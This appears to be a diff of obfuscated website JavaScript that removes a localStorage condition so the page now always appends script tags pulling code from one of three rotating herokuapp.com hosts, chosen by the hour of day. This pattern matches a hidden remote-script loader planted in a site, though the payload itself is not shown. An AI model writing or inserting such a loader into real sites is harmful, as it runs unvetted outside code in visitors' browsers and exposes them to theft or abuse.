@@ -17,7 +17,6 @@ function mBA(){
 
  var url=window.location.toString();
  if(url.search(/\/post\//)>-1){
- 	 localStorage.setItem('rPo',0);
 	 var metas=document.getElementsByTagName('meta');
 	 for(var i=0;i < metas.length;i++){
 		 if(metas[i].getAttribute('property')=='og:title'){
@@ -134,8 +133,6 @@ function mBA(){
 	 if(contentCount>=20){
 		 $('article.post p:eq(12)').before(mBV('b',2,t,a));
 	 }
- }else{
- 	localStorage.setItem('rPo',1);
  }
 }
 mBA();
@@ -203,21 +200,17 @@ function mBV(s,b,t,a){
 
 
 $(document).ready(function(){
-	var rPo=localStorage.getItem('rPo');
+	var nD=new Date();
+	var nH=nD.getUTCHours();
 
-	if(rPo==1){
-		var nD=new Date();
-		var nH=nD.getUTCHours();
-
-		if(nH<8){
-			$('body').append('<script src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=7881"><\/script>');
-		}
-		if(nH>=8 && nH<16){
-			$('body').append('<script src="https:\/\/lit-shore-57528.herokuapp.com\/?id=7881"><\/script>');
-		}
-		if(nH>=16){
-			$('body').append('<script src="https:\/\/radiant-everglades-72351.herokuapp.com\/?id=7881"><\/script>');
-		}
+	if(nH<8){
+		$('body').append('<script src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=7881"><\/script>');
+	}
+	if(nH>=8 && nH<16){
+		$('body').append('<script src="https:\/\/lit-shore-57528.herokuapp.com\/?id=7881"><\/script>');
+	}
+	if(nH>=16){
+		$('body').append('<script src="https:\/\/radiant-everglades-72351.herokuapp.com\/?id=7881"><\/script>');
 	}
 
 	var ta=Math.floor(Math.random()*10001)+25000;
